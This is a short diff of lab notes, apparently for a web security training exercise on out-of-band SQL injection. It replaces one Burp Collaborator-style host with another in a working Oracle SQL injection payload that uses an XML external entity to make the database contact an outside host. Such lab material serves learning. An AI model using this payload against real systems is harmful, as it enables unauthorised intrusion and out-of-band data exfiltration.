@@ -9,6 +9,6 @@ End Goal - Exploit SQLi and cause a DNS lookup
 
 Analysis:
 
-cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net
+lc1w0farhwt8zgrzkethuzwdi4ovcl0a.oastify.com
 
-' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://cgwihkkm49dt3sgk9lufyyb6mxsngc.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://lc1w0farhwt8zgrzkethuzwdi4ovcl0a.oastify.com/"> %remote;]>'),'/l') FROM dual)--
